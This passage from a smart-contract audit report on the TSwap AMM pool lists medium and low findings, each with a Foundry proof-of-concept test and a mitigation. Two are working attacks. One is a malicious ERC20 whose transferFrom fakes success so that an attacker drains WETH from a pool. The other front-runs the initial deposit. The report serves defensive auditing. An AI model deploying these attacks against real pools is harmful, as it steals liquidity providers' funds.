1. Deploy a token contract implementing a fee on transfer mechanism (e.g., a 1% fee on each transfer).
2. Create a TSWAP liquidity pool with this token and another standard token.
3. Perform a swap on TSWAP involving the fee on transfer token.
4. Observe the incorrect pricing and reserve imbalance in the pool due to the fee deducted during the token transfer.

## Tools Used
Manual Review

## Recommendations
Token Compatibility Check: Ensure that tokens added to Tswap pools do not implement a fee on transfer mechanism.
## <a id='M-03'></a>M-03. Rebasing Tokens will break TSWAP invariant X*Y = K

_Submitted by [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25). Selected submission by: [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol

## Summary
TSWAP protocol relies on maintaining a constant product invariant for its liquidity pools. The invariant formula, x⋅y=k, where 𝑥 and 𝑦 are the reserves of two tokens in the pool, ensures balanced trading and liquidity provision. Rebasing tokens, which automatically adjust their supply by increasing or decreasing balances proportionally across all holders, can disrupt this invariant, leading to potential issues within the protocol.

## Vulnerability Details
Rebasing tokens change their supply periodically based on certain conditions or triggers, affecting all balances proportionally. This means that the number of tokens held by any address, including the TSWAP pool, can change without any transfer event. When such tokens are used within TSWAP pools, the constant product invariant 𝑥⋅𝑦=𝑘 no longer holds due to the sudden and unaccounted changes in token reserves.

For example, if a rebasing event increases the supply of a token by 10%, the reserve balance in the TSWAP pool will also increase by 10% without any corresponding trade or liquidity provision event. This discrepancy breaks the TSWAP invariant, causing the liquidity pool to miscalculate reserves and leading to imbalanced pools.

## Impact
Incorrect Pricing: The pool will miscalculate token prices due to incorrect reserve balances, leading to potentially unfair trades and arbitrage opportunities.

Liquidity Provider Losses: Liquidity providers might incur unexpected losses as their share of the pool's value can decrease due to the miscalculation.

## Proof of Concept (PoC):
1. Deploy a rebasing token contract.
2. Create a TSWAP liquidity pool with this token and another standard token.
3. Perform a rebasing event that adjusts the token supply.
4. Observe the incorrect pricing and reserve imbalance in the pool due to the rebasing event.

## Tools Used
Manual Review

## Recommendations
Token Compatibility Check: Ensure that tokens added to TSWAP pools do not implement rebasing mechanisms.
## <a id='M-04'></a>M-04. The initial deposit can be frontrunned to grief the pool making it useless

_Submitted by [0x1912](/profile/clumv78j80003i5grvm92bhw4), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31). Selected submission by: [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol

### [M-01] The initial deposit can be frontrunned to grief the pool making it useless

**Description:**
An attacker can grief the pool contracts by front-running the first deposit and passing zero for `maximumPoolTokensToDeposit`. This will render the pool useless because no one else can use the `deposit` function to fill the needed `poolTokens`. Since in `getPoolTokensToDepositBasedOnWeth`, the `poolTokenReserves` would always be zero unless the initial depositor transfers the poolTokens directly to the contract. But this itself gives an incentive to the griefer because he can withdraw and get compensation after the direct transfer was done.


```javascript
    function getPoolTokensToDepositBasedOnWeth(
        uint256 wethToDeposit
    ) public view returns (uint256) {
@>      uint256 poolTokenReserves = i_poolToken.balanceOf(address(this));
        uint256 wethReserves = i_wethToken.balanceOf(address(this));
        return (wethToDeposit * poolTokenReserves) / wethReserves;
    }
```

**Impact:**
The impact of this vulnerability is significant as it allows an attacker to prevent legitimate users from participating in the pool by front-running the initial deposit. By doing so, the attacker can ensure that the pool remains underutilized or completely unusable for others who wish to deposit into it. This attack not only disrupts the intended functionality of the pool but also undermines trust in the platform, potentially leading to financial losses for those who attempt to interact with the compromised pool. Additionally, the attacker can exploit this situation to extract value from the system at the expense of legitimate participants, thereby gaining an unfair advantage.

**Proof of Concept:**
Add the following test to the existing test suite. Exploit steps:
1. The attacker waits for a `createPool` transaction in the mempool.
2. After finding one, they front-run or simply deposit some ETH and zero poolTokens before the actual pool creator intends to deposit.
3. LP can't deposit poolTokens via deposit function; LP has to transfer funds directly to run the pool.
4. Attacker withdraws getting more than his initial balance in PoolToken and losing no WETH.
   
```javascript
    function testInitialDepositCanBeFrontrunned() public {
        // Attacler deposits some eth and 0 pool token
        vm.startPrank(user);
        weth.approve(address(pool), 10e18);
        poolToken.approve(address(pool), 10e18);
        pool.deposit(1e9 + 1, 0, 0, uint64(block.timestamp));
        // lp cant deposit poolTokens via deposit function
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        uint256 depositedPtoken = pool.deposit(
            100e18,
            100e18,
            100e18,
            uint64(block.timestamp)
        );
        assertEq(poolToken.balanceOf(address(pool)),0);
        // lp has to transfer fund directly to run the pool 
        poolToken.transfer(address(pool), 100e18);
        // attacker withdraws getting more than his initial balance in PoolToken and loosing no wet
        vm.startPrank(user);
        pool.withdraw(pool.balanceOf(user), 1e9, 1e9, uint64(block.timestamp));
        assertEq(weth.balanceOf(user), 10e18);
        assert(poolToken.balanceOf(user) > 10e18);
    }
```
**Recommended Mitigation:**
Set a minimum deposit for pool token and check for it in the initial deposit. This way, even if the attacker front-runs the initial deposit, they won't gain anything from it. Note that this is just a simple example, and the real implementation should probably get the minimum initial pool token amount in the constructor.

```diff
 function deposit(
        uint256 wethToDeposit,
        uint256 minimumLiquidityTokensToMint,
        uint256 maximumPoolTokensToDeposit,
        uint64 deadline //@audit-wriiten as high,  med this does not check for deadline makes frontrunning attacks possible.
    )
        external
        revertIfZero(wethToDeposit)
        returns (uint256 liquidityTokensToMint)
    {
        .
        .
        .
        } else {
+           require(i_poolToken.balanceOf(address(this)) >0 , "some custom error");
            // This will be the "initial" funding of the protocol. We are starting from blank here!
            // We just have them send the tokens in, and we mint liquidity tokens based on the weth
            _addLiquidityMintAndTransfer(
                wethToDeposit,
                maximumPoolTokensToDeposit,
                wethToDeposit
            );
            liquidityTokensToMint = wethToDeposit;
        }
    }
```
## <a id='M-05'></a>M-05. The `TSwapPool::swapExactOutput` uses Hardcoded block.timestamp as deadline instead of getting it as input

_Submitted by [lulox](/profile/clk7oytas000wme08y4yvo0tp), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31). Selected submission by: [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol

### [M-02] The `TSwapPool::swapExactOutput` uses Hardcoded block.timestamp as deadline instead of getting it as input

**Description:**
In the `sellPoolTokens` function, `block.timestamp` is hardcoded as the deadline for the `swapExactOutput` transaction. Since `block.timestamp` can be influenced by validators, it's not recommended to use it directly as a deadline. Instead, the deadline should be obtained as an input parameter to ensure that users have control over the validity period of their transactions.

```javascript
    function sellPoolTokens(
        uint256 poolTokenAmount
    ) external returns (uint256 wethAmount) {
        return
            swapExactOutput(
                i_poolToken,
                i_wethToken,
                poolTokenAmount,
@>              uint64(block.timestamp)
            );
    }
```

**Impact:**
Using `block.timestamp` directly as the deadline can lead to potential manipulation by miners or validators who have some control over the block timestamp within certain limits. This could result in transactions being included at times that are not optimal for the user, potentially leading to less favorable exchange rates or other unintended consequences.

**Proof of Concept:**
While a direct proof of concept might be challenging to demonstrate due to the nature of blockchain networks and the difficulty in simulating miner behavior, the theoretical risk exists whenever block timestamps are used in a way that could be influenced by miners. Users might experience transactions being processed later than intended, especially in networks where block times are longer or where miner manipulation is more feasible.

**Recommended Mitigation:**

To mitigate this issue, the deadline should be added as an input parameter to the `sellPoolTokens` function. This change allows users to specify their own deadlines, reducing the risk associated with relying on `block.timestamp`.

```diff
    function sellPoolTokens(
        uint256 poolTokenAmount,
+       uint64 deadline
    ) external returns (uint256 wethAmount) {
        return
            swapExactOutput(
                i_poolToken,
                i_wethToken,
                poolTokenAmount,
-               uint64(block.timestamp)
+               deadline
            );
    }
```


# Low Risk Findings

## <a id='L-01'></a>L-01. `TSwapPool::swapExactInput` don't return the output amount

_Submitted by [rabuawad](/profile/clxow97ie0003das7vwbu4yvt), [sheep](/profile/clwzyccte00009ky8t4ft529d), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [mishraji874](/profile/cltepemz50000ouhs442ophcm), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [0x1912](/profile/clumv78j80003i5grvm92bhw4), [ThomasHeim](/profile/clqbwkc6h0000soy0ixbne8xa), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [soupy0x6138](/profile/clxtrdlee0002mh58dhdplsq9), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [swapnaliss](/profile/clxwv1fpq00178s1krjvigqqr), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [preslavxyz](/profile/clxvlkgdd0006g4l447xhq89d), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25). Selected submission by: [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur)._      
            


## Summary
When `TSwapPool::swapExactInput` is called it's make the swap but don't return the output amount to the user.

## Vulnerability Details
When `TSwapPool::swapExactInput` is called we don't have the output amount returned as we can see below:

```solidity
    function swapExactInput(
        IERC20 inputToken,
        uint256 inputAmount,
        IERC20 outputToken,
        uint256 minOutputAmount,
        uint64 deadline
    )
        public
        revertIfZero(inputAmount)
        revertIfDeadlinePassed(deadline)
        returns (uint256 output) // this variable is not used
    {
        uint256 inputReserves = inputToken.balanceOf(address(this));
        uint256 outputReserves = outputToken.balanceOf(address(this));

        uint256 outputAmount = getOutputAmountBasedOnInput(
            inputAmount,
            inputReserves,
            outputReserves
        );

        if (outputAmount < minOutputAmount) {
            revert TSwapPool__OutputTooLow(outputAmount, minOutputAmount);
        }

        _swap(inputToken, inputAmount, outputToken, outputAmount);
    }
```

## Impact
Because of lack this return, we don't have the output amount that user receives when make the swap

## Tools Used
Solidity and Foundry

## Proof of Concept
Add the following PoC to `test/unit/TSwapPool.t.sol`:

```solidity
    function testDepositSwapExactInput() public {
        // Add funds to the pool
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        vm.startPrank(user);
        poolToken.approve(address(pool), 10e18);
        // After we swap, there will be ~110 tokenA, and ~91 WETH
        // 100 * 100 = 10,000
        // 110 * ~91 = 10,000
        uint256 expected = 9e18;

        uint256 userInitialPoolTokenBalance = poolToken.balanceOf(user);
        uint256 userInitialWethBalance = weth.balanceOf(user);

        uint256 outputAmount = pool.swapExactInput(poolToken, userInitialPoolTokenBalance, weth, expected, uint64(block.timestamp));

        uint256 userFinalPoolTokenBalance = poolToken.balanceOf(user);
        uint256 userFinalWethBalance = weth.balanceOf(user);

        assertEq(userFinalPoolTokenBalance, 0, "The balance of pool tokens should be 0");
        assertEq(userFinalWethBalance > userInitialWethBalance, true, "The balance of WETH should be greater than the initial balance");
        assertEq(outputAmount >= expected, true, "The output amount should be greather than or equal to the expected amount");
    }
```

## Recommendations
In the `TSwapPool::swapExactInput` you could:
  - Rename from `returns (uint256 output)` to `returns (uint256 outputAmount)`
  - And remove the other declaration from `uint256 outputAmount = getOutputAmountBasedOnInput(` to `outputAmount = getOutputAmountBasedOnInput(`

```diff
    function swapExactInput(
        IERC20 inputToken,
        uint256 inputAmount,
        IERC20 outputToken,
        uint256 minOutputAmount,
        uint64 deadline
    )
        public
        revertIfZero(inputAmount)
        revertIfDeadlinePassed(deadline)
-      returns (uint256 output)
+      returns (uint256 outputAmount)
    {
        uint256 inputReserves = inputToken.balanceOf(address(this));
        uint256 outputReserves = outputToken.balanceOf(address(this));

-      uint256 outputAmount = getOutputAmountBasedOnInput(
+      outputAmount = getOutputAmountBasedOnInput(
            inputAmount,
            inputReserves,
            outputReserves
        );

        if (outputAmount < minOutputAmount) {
            revert TSwapPool__OutputTooLow(outputAmount, minOutputAmount);
        }

        _swap(inputToken, inputAmount, outputToken, outputAmount);
    }
```
## <a id='L-02'></a>L-02. Incorrect Values Emitted in LiquidityAdded Event

_Submitted by [maikelordaz](/profile/cltpyvz0u0000f3xerby0tpdw), [Batman](/profile/clkc47fv10006l908u64cn5ef), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [mishraji874](/profile/cltepemz50000ouhs442ophcm), [ThomasHeim](/profile/clqbwkc6h0000soy0ixbne8xa), [rangappa](/profile/clxc4vyfn000a415fjwungxrc), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [sheep](/profile/clwzyccte00009ky8t4ft529d), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [talha77](/profile/clr23lcix000li3bvc5j70fy8), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [soupy0x6138](/profile/clxtrdlee0002mh58dhdplsq9), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [swapnaliss](/profile/clxwv1fpq00178s1krjvigqqr), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [0xsalami](/profile/clt01df3800035pfctlu2xr0m). Selected submission by: [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol#L194

## Summary
The LiquidityAdded event in the TSWAP contract emits incorrect values for the parameters poolTokensToDeposit and wethToDeposit. This discrepancy can lead to confusion and misinterpretation of the actual amounts involved in the liquidity addition process.

## Vulnerability Details
Events in smart contracts are essential for logging critical information that can be accessed by external users and services. Inaccurate emission of event values can lead to a range of issues including, but not limited to, incorrect data reporting, difficulty in auditing transactions, and misinformed decision-making by users.

The issue specifically lies in the LiquidityAdded event, where the values emitted for poolTokensToDeposit and wethToDeposit do not accurately reflect the actual amounts being deposited.

```solidity
 function _addLiquidityMintAndTransfer(
        uint256 wethToDeposit,
        uint256 poolTokensToDeposit,
        uint256 liquidityTokensToMint
    )
        private
    {
        _mint(msg.sender, liquidityTokensToMint);

        //@audit wrong amounts emitted
        // event LiquidityAdded(address indexed liquidityProvider, uint256 wethDeposited, uint256 poolTokensDeposited);

@>      emit LiquidityAdded(msg.sender, poolTokensToDeposit, wethToDeposit);
        
        // Interactions
        i_wethToken.safeTransferFrom(msg.sender, address(this), wethToDeposit);
        i_poolToken.safeTransferFrom(msg.sender, address(this), poolTokensToDeposit);
    }
```

## Proof of Concept (PoC):
1. Deploy a contract with the LiquidityAdded event.
2. Call the deposit function with specified amounts of pool tokens and WETH.
3. Observe the emitted event and note the discrepancy between the actual values and the emitted values.

## Impact
1. User Confusion: Users may be misled about the actual amounts of liquidity added, leading to confusion and potential mistrust in the platform.
2. Inaccurate Analytics: Third-party services that rely on event data for analytics and reporting will produce incorrect outputs, impacting decision-making processes.
3. Auditing Difficulties: Inaccurate event data complicates the auditing and verification of transactions, potentially masking other underlying issues.

## Tools Used
Manual Review

## Recommendations
1. Review and Correct Emission Logic: Thoroughly review the logic that prepares values for the LiquidityAdded event and ensure they accurately reflect the actual amounts involved.
2. Unit Testing: Implement comprehensive unit tests to validate that the emitted values match the expected values based on the inputs provided to the addLiquidity function.

```diff
function _addLiquidityMintAndTransfer(
        uint256 wethToDeposit,
        uint256 poolTokensToDeposit,
        uint256 liquidityTokensToMint
    )
        private
    {
        _mint(msg.sender, liquidityTokensToMint);

        //@audit wrong amounts emitted
        // event LiquidityAdded(address indexed liquidityProvider, uint256 wethDeposited, uint256 poolTokensDeposited);

-     emit LiquidityAdded(msg.sender, poolTokensToDeposit, wethToDeposit);
+    emit LiquidityAdded(msg.sender, wethToDeposit, poolTokensToDeposit);
        
        // Interactions
        i_wethToken.safeTransferFrom(msg.sender, address(this), wethToDeposit);
        i_poolToken.safeTransferFrom(msg.sender, address(this), poolTokensToDeposit);
    }



```
## <a id='L-03'></a>L-03. Steal funds with malicious ERC20

_Submitted by [0x40](/profile/clqim6y8j0006lgfv35y3lfup), [agent3bood](/profile/clxp80fib0003cnvwyg4fgbge). Selected submission by: [0x40](/profile/clqim6y8j0006lgfv35y3lfup)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol#L410

## Summary
An attacker can steal weth funds from a pool using a malicious ERC20 contract.
If an attacker create a pool of PoolToken/Weth with PoolToken being a malicious ERC20 with a malicious code in the transferFrom() function he would be able to steal weth funds by swaping NO TOKEN in exchange for Weth.

For example an attacker create a PoolToken/Weth Pool and wait a few days for people to trade. Now let's say there is more Weth than ititialy in the pool.
Now the attacker can "swap" with no money, and steal weth from the pool because the contract doesn't check if poolToken supposedly sent are indeed received by the contract, considering the poolToken is safe but you never know.

## Vulnerability Details

The vulnerability is in the _swap() function in TSwapPool.sol :

```solidity
function _swap(IERC20 inputToken, uint256 inputAmount, IERC20 outputToken, uint256 outputAmount) private {
        if ( _isUnknown(inputToken) || _isUnknown(outputToken) || inputToken == outputToken ) {
            revert TSwapPool__InvalidToken();
        }

        swap_count++;
        if (swap_count >= SWAP_COUNT_MAX) {
            swap_count = 0;
            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
        }
        emit Swap(
            msg.sender,
            inputToken,
            inputAmount,
            outputToken,
            outputAmount
        );

        inputToken.safeTransferFrom(msg.sender, address(this), inputAmount); // ==> Can steal WETH from Pool by using a malicious ERC20 with a Transfer fct returning true every time a transfer is performed by a specific address (the attacker address), without sending any funds
        outputToken.safeTransfer(msg.sender, outputAmount);
    }
```
-----
1) Create an ERC20 token replacing the transferFrom() function by this malicious code :

```solidity
function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();

	if (address(from) == address(0x7BcADA6410D7d84fE5A9Aa4CC546EB51c8982DFF)) { //0x...attackerAccount...
		return true;
	} 

        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }
```
If and only if the address is the attacker address, then do not transfer tokens but return true as if the transfer was done.

2) inputToken.safeTransfer(0xattackerAccount, address(this), inputAmount) will not fail and the next line of code,
which is transfering the outputToken, will go through.
We just robbed the Pool !

Solution to mitigate :
You should verify the balance of the inputToken in the pool contract after the supposedly transfer before executing the transfer of the outputToken.

-----
POC: Modify TSwapPool.t.sol with this :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/PoolFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { ERC20MockMalicious } from "../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20MockMalicious.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract TSwapPoolTest is Test {
    TSwapPool pool;
    ERC20MockMalicious poolToken;
    ERC20Mock weth;

    address liquidityProvider = makeAddr("liquidityProvider");
    //address user = makeAddr("user");
    address user = address(0x7BcADA6410D7d84fE5A9Aa4CC546EB51c8982DFF);

    function setUp() public {
        poolToken = new ERC20MockMalicious();
        weth = new ERC20Mock();
        pool = new TSwapPool(address(poolToken), address(weth), "LTokenA", "LA");

        weth.mint(liquidityProvider, 200e18);
        poolToken.mint(liquidityProvider, 200e18);

        weth.mint(user, 10e18);
        poolToken.mint(user, 10e18);
    }

function testDepositSwap() public { // Test Deposit + fake swap to prove we can steal funds with Malicious ERC20 token code because of lack of check after "swapping"
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        vm.startPrank(user);
        poolToken.approve(address(pool), 10e18);

        pool.swapExactInput(poolToken, 10e18, weth, 0, uint64(block.timestamp));

        assert(poolToken.balanceOf(address(pool)) == 100e18); // Test to verify that no poolToken was added to the pool, meaning no transfer from user was done
        console.logUint(poolToken.balanceOf(address(pool)));
        assert(weth.balanceOf(user) >= 0); // Test for receiving tokens you shouldn't receive (stolen funds)
        console.logUint(weth.balanceOf(address(pool)));
    }

}

$ forge test -vv

Running 1 test for test/unit/Modified_TSwapPool.t.sol:TSwapPoolTest
[PASS] testDepositSwap() (gas: 220432)

Logs:
  100000000000000000000 <--- The pool didn't receive any poolToken (before : 100e18, after : 100e18, should be 110e18)
  90933891061198508685 <--- User received weth without spending any fund

Test result: ok. 1 passed; 0 failed; finished in 2.43ms
```
## Impact

Steal Weth from the Pool. Loss of funds.

## Tools Used

Foundry for POC

## Recommendations

Solution to mitigate :
You should verify the balance of the inputToken after the supposedly transfer before executing the transfer of the outputToken.
Or whitelist tokens for the pool.
## <a id='L-04'></a>L-04. Hardcoded decimal value leads to incorrect conversion when ERC20 does not use 18 decimals.

_Submitted by [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [jenniferSun](/profile/clsb1ozmi0000unx8zvm2lx40), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25). Selected submission by: [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8)._      
            


Hardcoded decimal value leads to incorrect conversion when ERC20 does not use 18 decimals.

**Description**  
The convenience function below calls `getOutputAmountBasedOnInput()` with a hardcoded value of `1e18` for the parameter `inputAmount`. This assumes the ERC token will use 18 decimals which is not true for all ERC tokens. eg. USDC uses 6 decimals and  WBTC uses 8.

- `getPriceOfOnePoolTokenInWeth()`

```javascript

function getPriceOfOnePoolTokenInWeth() external view returns (uint256) {
    return
        getOutputAmountBasedOnInput(
            1e18, //@audit what if it's a USDC with 6 decimals // input amount - 1 pool token
            i_poolToken.balanceOf(address(this)),              // input reserves
            i_wethToken.balanceOf(address(this))
        );
}

```
This leads to an incorrect calculation of the value of one token in the pool.

The documentation states "Any ERC20 token":

> **Audit Scope Details**  
>- Solc Version: 0.8.20
>- Chain(s) to deploy contract to: Ethereum
>-  Tokens:
	- Any ERC20 token


**Impact**

The protocol does not correctly support all ERC tokens even though the documentation states all ERC tokens are supported. When tokens that utilise a decimal value other than 18 are used in the pool the conversion calculations above will be incorrect.  

**Severity**  
This function would likely be used to make decisions based on expected pricing and therefore could pose a significant risk to end-users.

Medium Impact  
High Likelihood   
Severity: Medium


**Proof of Concept**  

The following standalone unit test demonstrates the issue:
```javascript
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { PoolFactory } from "../../src/PoolFactory.sol";
import { TSwapPool } from "../../src/TSwapPool.sol";

import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {USDCMock} from "./USDCMock.sol"; //usdc
import {WETHMock} from "./WETHMock.sol"; //weth

contract ExperimentTest is Test {

    TSwapPool pool;
    USDCMock poolToken;
    WETHMock weth;
    PoolFactory poolFactory;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");

    address poolAddress;

    function setUp() public {
        poolToken = new USDCMock();
        weth = new WETHMock();
        poolFactory = new PoolFactory( address(weth) );
        poolAddress = poolFactory.createPool( address(poolToken) );
        pool = TSwapPool(poolFactory.getPool( address(poolToken) ));
    }

   function testDecimals() public {
        uint256 oneToken = 1e6;
        uint256 liquidity = oneToken * 1000;
        
        // generate some liquidity
        weth.mint(liquidityProvider, liquidity);
        poolToken.mint(liquidityProvider, liquidity);

        // allocate some weth to the user to use for swapping 
        weth.mint(user, oneToken);
        //poolToken.mint(user, oneToken);

        // add liquidity to the pool
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), liquidity);
        poolToken.approve(address(pool), liquidity);

        //deposit liquidity into the pool at 1:1 ratio
        pool.deposit(liquidity, liquidity, liquidity, uint64(block.timestamp));
        vm.stopPrank();

        //now we have a 1:1 ratio of Weth:PoolToken (which is 1e6)
        // call the function to get the price
        uint256 priceInWethForOnePoolToken = pool.getPriceOfOnePoolTokenInWeth();

        // Enable this function to demonstrate the difference between 1e18 and 1e6
        // You'll also need to add getPriceOfOneUSDCPoolTokenInWeth to TWSwapPool.sol
        //uint256 priceInWethForOneUSDCPoolToken = pool.getPriceOfOneUSDCPoolTokenInWeth();
        
        uint256 oneWeth = 1e18;

        console.log("One Pool Token: ", oneToken);
        console.log("One Weth Token: ", oneWeth);

        console.log("priceInWethForOnePoolToken: ",priceInWethForOnePoolToken);
        //Enable this function to demonstrate the difference between 1e18 and 1e6
        //console.log("priceInWethForOneUSDCPoolToken: ", priceInWethForOneUSDCPoolToken);

    }
}


// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract USDCMock is ERC20 {
 
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    constructor() ERC20("USDCMock", "USDCM") {  }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract WETHMock is ERC20 {
    constructor() ERC20("WETHMock", "WETHM") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

```

Result with current code:  
``` javascript

Ran 1 test for test/unit/ExperimentTest.t.sol:ExperimentTest
[PASS] testDecimals() (gas: 239736)
Logs:
  One Pool Token:  1000000
  One Weth Token:  1000000000000000000
  priceInWethForOnePoolToken:  999999998

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.07ms (1.62ms CPU time)

```

Result with implemenation using 1e6 is shown below:
```javascript

// You'd need to add getPriceOfOneUSDCPoolTokenInWeth to TWSwapPool.sol
// function uses 1e6 instead of 1e18
function getPriceOfOneUSDCPoolTokenInWeth() external view returns (uint256) {
    return
        getOutputAmountBasedOnInput(
            1e6, //@audit-experiment USDC with 6 decimals 
            i_poolToken.balanceOf(address(this)),
            i_wethToken.balanceOf(address(this))
        );
}


Ran 1 test for test/unit/ExperimentTest.t.sol:ExperimentTest
[PASS] testDecimals() (gas: 242930)
Logs:
  One Pool Token:  1000000
  One Weth Token:  1000000000000000000
  priceInWethForOnePoolToken:      999999998
  priceInWethForOneUSDCPoolToken:  996006

```

**Recommended mitigation**  

- Create a whitelist of supported ERC20 tokens.
- Create a mapping from token symbol to decimals and use that as a lookup for calculations rather than expecting 18 decimals for all tokens. 

**References**  

[https://github.com/Cyfrin/2024-06-t-swap/blob/d1783a0ae66f4f43f47cb045e51eca822cd059be/src/TSwapPool.sol#L452](https://github.com/Cyfrin/2024-06-t-swap/blob/d1783a0ae66f4f43f47cb045e51eca822cd059be/src/TSwapPool.sol#L452)

[https://github.com/Cyfrin/2024-06-t-swap/blob/d1783a0ae66f4f43f47cb045e51eca822cd059be/src/TSwapPool.sol#L461](https://github.com/Cyfrin/2024-06-t-swap/blob/d1783a0ae66f4f43f47cb045e51eca822cd059be/src/TSwapPool.sol#L461)

**Tools Used**   
- Manual review
- Foundry

## <a id='L-05'></a>L-05.  Missing Rounding in getInputAmountBasedOnOutput Calculation

_Submitted by [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/TSwapPool.sol#L280

## Summary
The getInputAmountBasedOnOutput function does not round up the result by adding 1 to the calculated input amount. This omission can lead to underestimation of the required input amount, which may result in failed transactions due to insufficient input provided.

## Vulnerability Details
In automated market makers (AMMs) like Uniswap, the calculation of input amount based on desired output typically involves rounding up the result to ensure that enough input tokens are provided to cover the required output amount and any associated fees. Failing to add 1 to the calculated result can result in scenarios where the provided input amount is just short of what is necessary, causing transactions to revert.

```solidity
 function getInputAmountBasedOnOutput(
        uint256 outputAmount,
        uint256 inputReserves,
        uint256 outputReserves
    )
        public
        pure
        revertIfZero(outputAmount)
        revertIfZero(outputReserves)
        returns (uint256 inputAmount)
    {
@>        return (inputReserves * outputAmount * 10000) / ((outputReserves - outputAmount) * 997);
    }
```

## POC

```solidity
 function testRounding() public {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 200e18);
        poolToken.approve(address(pool), 200e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));

        assertEq(pool.balanceOf(liquidityProvider), 100e18);
        assertEq(weth.balanceOf(liquidityProvider), 100e18);
        assertEq(poolToken.balanceOf(liquidityProvider), 100e18);

        assertEq(weth.balanceOf(address(pool)), 100e18);
        assertEq(poolToken.balanceOf(address(pool)), 100e18);

        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));

        assertEq(pool.balanceOf(liquidityProvider), 200e18);
        assertEq(weth.balanceOf(liquidityProvider), 0);

        // Get input (weth) for an output (pool token) of 10e18
        uint256 expected =
            pool.getInputAmountBasedOnOutput(10e18, weth.balanceOf(address(pool)), poolToken.balanceOf(address(pool)));

